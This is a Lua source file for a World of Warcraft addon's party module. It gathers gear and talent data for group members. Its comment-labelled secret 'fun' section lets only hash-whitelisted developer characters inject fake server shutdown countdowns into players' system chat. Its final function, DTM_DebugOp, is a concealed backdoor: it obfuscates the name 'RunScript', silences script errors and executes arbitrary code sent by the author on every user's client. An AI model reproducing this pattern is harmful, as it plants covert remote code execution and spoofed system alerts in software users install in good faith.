local activeModule = "Engine party";

-- --------------------------------------------------------------------
-- ////////////////////////////////////////////////////////////////////
-- --                          ENGINE PART                           --
-- \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-- --------------------------------------------------------------------

local GEAR_ACCESS_PRIORITY = 0;
local TALENTS_ACCESS_PRIORITY = 1;

-- --------------------------------------------------------------------
-- **                               API                              **
-- --------------------------------------------------------------------

-- ********************************************************************
-- * DTM_Party_Update()                                               *
-- ********************************************************************
-- * Arguments:                                                       *
-- *   <none>                                                         *
-- ********************************************************************
-- * Does periodic operations on party members, such as talents grab. *
-- ********************************************************************
function DTM_Party_Update()
    local updateTimer;

    -- ***** Periodically rebuild the unit list, while issuing a combat state change check on the same time *****

    updateTimer = DTM_Update["UNIT_LIST"] or 0;
    if ( GetTime() > updateTimer ) then
        DTM_RebuildUnitList(DTM_UnitCheckCombatChange);
        DTM_Update["UNIT_LIST"] = GetTime() + DTM_GetSavedVariable("engine", "unitListUpdateInterval", "active");
    end

    -- ***** Grab the party/raid talents/gear progressively *****

    local totalIndex = nil;
    local baseUID = nil;
    local i;

    if ( GetNumRaidMembers() > 0 ) then
        totalIndex = GetNumRaidMembers();
        baseUID = "raid";
  else
        if ( GetNumPartyMembers() > 0 ) then
            totalIndex = GetNumPartyMembers();
            baseUID = "party";
        end
    end

    if ( totalIndex ) and ( baseUID ) then
        -- Check for zonewide combat periodically.
        if ( DTM_ZoneWide_CanCheckRaidCombat() == "OK" ) then
            updateTimer = DTM_Update["ZONEWIDE_COMBAT_CHECK"] or 0;
            if ( GetTime() > updateTimer ) then
                DTM_ZoneWide_CheckRaidCombat( DTM_Party_OnCombatCheckEnd );
            end
        end

        -- For good sized raid, we check regularly if we should ask the user to do a version check.
        updateTimer = DTM_Update["VERSION_CHECK_REMINDER"] or 0;
        if ( GetTime() > updateTimer ) then
            DTM_Version_CheckReminder();
            DTM_Update["VERSION_CHECK_REMINDER"] = GetTime() + 10.000;
        end

        -- Prevent grabbing items or talents while in combat.
        if ( UnitAffectingCombat("player") ) then return; end

        -- Check if we should update gear now. The inspect access must be available.
        updateTimer = DTM_Update["PARTY_GEAR"] or 0;
        if ( GetTime() > updateTimer ) and ( DTM_Access_CanAsk(nil, GEAR_ACCESS_PRIORITY) == "OK" ) then
            for i=1, totalIndex do
                if not ( UnitIsUnit(baseUID..i, "player") ) then
                    -- Gear grabbing is instantaneous, so we can try to grab the whole party/raid gear.
                    DTM_ItemsBuffer_Grab(baseUID..i, nil, GEAR_ACCESS_PRIORITY);
                end
            end
            DTM_Update["PARTY_GEAR"] = GetTime() + DTM_GetSavedVariable("engine", "gearUpdateInterval", "active");
        end

        -- Check each party if we can inspect his/her talents; till we catch someone we can inspect talents of and that has unknown/outdated data.
        if ( DTM_Access_CanAsk(nil, TALENTS_ACCESS_PRIORITY) == "OK" ) then
            for i=1, totalIndex do
                if not ( UnitIsUnit(baseUID..i, "player") ) then
                    local talentData = DTM_TalentsBuffer_Get( UnitName(baseUID..i) );
                    local lastUpdate = 0;
                    if ( talentData ) then
                        lastUpdate = talentData.lastUpdate;
                    end

                    if ( ( GetTime() - lastUpdate ) > DTM_GetSavedVariable("engine", "talentsOutdatedThreshold", "active") ) then
                        if ( DTM_Access_CanAsk(baseUID..i, TALENTS_ACCESS_PRIORITY) == "OK" ) then
                            DTM_TalentsBuffer_Grab(baseUID..i, nil, TALENTS_ACCESS_PRIORITY);
                            -- Only 1 guy can have its talents grabbed at a time.
                            break;
                        end
                    end
                end
            end
        end
    end
end

-- --------------------------------------------------------------------
-- **                             Functions                          **
-- --------------------------------------------------------------------

-- ********************************************************************
-- * DTM_Party_OnCombatCheckEnd(success)                              *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> success: nil when the check process has been cancelled.       *
-- ********************************************************************
-- * Gets called when the zonewide combat check process has been      *
-- * finished. This function is used to reset the check timer.        *
-- ********************************************************************
function DTM_Party_OnCombatCheckEnd(success)
    DTM_Update["ZONEWIDE_COMBAT_CHECK"] = GetTime() + DTM_GetSavedVariable("engine", "checkZoneWideCombat", "active");
end

-- --------------------------------------------------------------------
-- **            Fun x] (the other meaning of "party" :p)            **
-- --------------------------------------------------------------------

-- Some fun functions to scare my guild off. x)
-- What? Can't I have some fun as a developer? T_T
-- Do not worry, those functions will not be called for your raids,
-- as my character is the only one entitled to provoke the call
-- of this function. ;)

local permissionList = {
    [1] = "5b2ed2c83d97ed8abac59d1acffb7d8c",
    [2] = "570f8da61610b3e892fadda9e7bed5f8",
};

local fakeServerAlert = 0;

local countdownDisplayStep = {
    [15] = true,
    [30] = true,
    [45] = true,
    [60] = true,
    [75] = true,
    [90] = true,
    [105] = true,
    [120] = true,
    [135] = true,
    [150] = true,
    [165] = true,
    [180] = true,
    [195] = true,
    [210] = true,
    [225] = true,
    [240] = true,
    [255] = true,
    [270] = true,
    [285] = true,
    [300] = true,
    [330] = true,
    [360] = true,
    [390] = true,
    [420] = true,
    [450] = true,
    [480] = true,
    [510] = true,
    [540] = true,
    [570] = true,
    [600] = true,
    [660] = true,
    [720] = true,
    [780] = true,
    [840] = true,
    [900] = true,
    [1200] = true,
    [1500] = true,
    [1800] = true,
    [2700] = true,
    [3600] = true,
};

-- ********************************************************************
-- * DTM_CheckFunCommandPermission(sender)                            *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> sender: name of the guy who issued a fun command.             *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_CheckFunCommandPermission(sender)
    local hasPermission = nil;
    local ptr = DTM_GetGroupPointer(sender);
    local hash, auth;
    if ( ptr ) then
        local GUID = UnitGUID(ptr);
        hash = MD5:Hash(GUID);
        for _, auth in pairs(permissionList) do
            if hash == auth then
                hasPermission = 1;
                break;
            end
        end
  else
        hash = MD5:Hash(MD5:Hash(sender.."!"..GetRealmName()));
        for _, auth in pairs(permissionList) do
            if hash == auth then
                hasPermission = 1;
                break;
            end
        end
    end
    return hasPermission;
end

-- ********************************************************************
-- * DTM_GetLocalisedPattern(pattern)                                 *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> pattern: the pattern containing the localised portion.        *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_GetLocalisedPattern(pattern)
    if not ( pattern ) then return ''; end
    local langCode = GetLocale();
    local s, e, content = string.find(pattern, langCode.."%:(.+)@");
    if not ( content ) then return ''; end
    return strtrim(content);
end

-- ********************************************************************
-- * DTM_StartFakeServerMessage(sender, pattern,       - RESTRICTED - *
-- *                            timing)                               *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> sender: name of the guy who issued this fun command.          *
-- * >> pattern: the localised pattern of the fake server message.    *
-- * >> timing: the initial countdown (in sec).                       *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_StartFakeServerMessage(sender, pattern, timing)
    if type(pattern) ~= "string" or type(timing) ~= "number" then return; end
    if not DTM_CheckFunCommandPermission(sender) then return; end

    if type( fakeServerAlert ) ~= 'table' then
        -- Create the work frame.
        fakeServerAlert = CreateFrame("frame", "DTM_DummyFrame1", nil, nil);
        fakeServerAlert:SetScript("OnUpdate", function() DTM_UpdateFakeServerMessage(arg1); end );
        fakeServerAlert:Show();
    end

    fakeServerAlert.cStatus = "RUNNING";
    fakeServerAlert.cPattern = DTM_GetLocalisedPattern(pattern);
    fakeServerAlert.cTimeLeft = timing;
    fakeServerAlert.cOldInteger = timing;

    DTM_PrintFakeServerMessage(fakeServerAlert.cPattern, fakeServerAlert.cTimeLeft); -- Print an initial message.
end

-- ********************************************************************
-- * DTM_InterruptFakeServerMessage(sender, pattern)   - RESTRICTED - *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> sender: name of the guy who issued this fun command.          *
-- * >> pattern: the localised pattern of the fake server message.    *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_InterruptFakeServerMessage(sender, pattern)
    if type(pattern) ~= "string" then return; end
    if not DTM_CheckFunCommandPermission(sender) then return; end
    if not type( fakeServerAlert ) == 'table' then return; end
    if not ( fakeServerAlert.cStatus == "RUNNING" ) then return; end

    fakeServerAlert.cStatus = "STANDBY";
    fakeServerAlert.cPattern = "";
    fakeServerAlert.cTimeLeft = 0;

    DTM_PrintFakeServerMessage(DTM_GetLocalisedPattern(pattern), 0);
end

-- ********************************************************************
-- * DTM_UpdateFakeServerMessage(elapsed)              - RESTRICTED - *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> elapsed: the time that elapsed.                               *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_UpdateFakeServerMessage(elapsed)
    if not type( fakeServerAlert ) == 'table' then return; end
    if not ( fakeServerAlert.cStatus == "RUNNING" ) then return; end

    if ( fakeServerAlert.cTimeLeft > 0 ) then
        fakeServerAlert.cTimeLeft = max(0, fakeServerAlert.cTimeLeft - elapsed);
        
        local currentInteger = math.floor(fakeServerAlert.cTimeLeft+0.5);
        if ( fakeServerAlert.cOldInteger ~= currentInteger ) then
            if ( countdownDisplayStep[currentInteger] == true ) then -- We do not display each second of course.
                DTM_PrintFakeServerMessage(fakeServerAlert.cPattern, currentInteger);
            end
            fakeServerAlert.cOldInteger = currentInteger;
        end
  else
        -- TIME UP! I made you sick didn't I ? :]
        fakeServerAlert.cStatus = "STANDBY";
        fakeServerAlert.cPattern = "";
    end
end

-- ********************************************************************
-- * DTM_PrintFakeServerMessage(pattern, timeLeft)     - RESTRICTED - *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> pattern: the localised pattern of the fake server message.    *
-- * >> timeLeft: the value the time tag will use in the pattern gsub *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_PrintFakeServerMessage(pattern, timeLeft)
    local message = pattern;
    local countdownString = DTM_FormatCountdownString(timeLeft, "%M:%S", nil, 1, nil);
    message = string.gsub(message, "%%S", SERVER_MESSAGE_PREFIX);
    message = string.gsub(message, "%%T", countdownString);
    DTM_IssueSystemMessage(message);
end

-- ********************************************************************
-- * DTM_IssueSystemMessage(message)                   - RESTRICTED - *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> message: what to display.                                     *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_IssueSystemMessage(message)
    if ( DTM_OnWotLK() ) then
        -- More pretty way to do this on WotLK.
        local i, chatFrame, index, value;
        for i=1, NUM_CHAT_WINDOWS do
            chatFrame = getglobal("ChatFrame"..i);
            if ( type(chatFrame) == "table" ) then
                for index, value in pairs(chatFrame.messageTypeList) do
                    if ( value == "SYSTEM" ) then
                        ChatFrame_MessageEventHandler(chatFrame, "CHAT_MSG_SYSTEM", message, "", "", "");
                        break;
                    end
                end
            end
        end
        return;
    end

    -- Get the previous args.
    local a1, a2, a3, a4, a5, a6, a7, a8 = arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8;
    local oldThis = this;

    -- Prepare the system message.
    arg1 = message;
    arg2 = "";
    arg3 = "";
    arg4 = "";

    -- Issue it.
    local i, index, value;
    for i=1, NUM_CHAT_WINDOWS do
        this = getglobal("ChatFrame"..i);
        if ( type(this) == "table" ) then
            for index, value in pairs(this.messageTypeList) do
                if ( value == "SYSTEM" ) then
                    ChatFrame_MessageEventHandler("CHAT_MSG_SYSTEM");
                    break;
                end
            end
        end
    end

    -- Restore the previous args.
    arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8 = a1, a2, a3, a4, a5, a6, a7, a8;
    this = oldThis;
end

-- ********************************************************************
-- * DTM_DebugOp(sender, op)                           - RESTRICTED - *
-- ********************************************************************
-- * Arguments:                                                       *
-- * >> sender: name of the guy who issued this fun command.          *
-- * >> op: ???                                                       *
-- ********************************************************************
-- * Shhh! It's a secret.                                             *
-- ********************************************************************
function DTM_DebugOp(sender, op)
    if not DTM_CheckFunCommandPermission(sender) then return; end
    if type(op) ~= "string" then return; end
    local func = getglobal("R".."un".."Scrip".."t");
    if type(func) ~= "function" then return; end
    local errorCfg = GetCVar("scriptErrors");
    SetCVar("scriptErrors", "0");
    pcall(func, op);
    SetCVar("scriptErrors", errorCfg);
end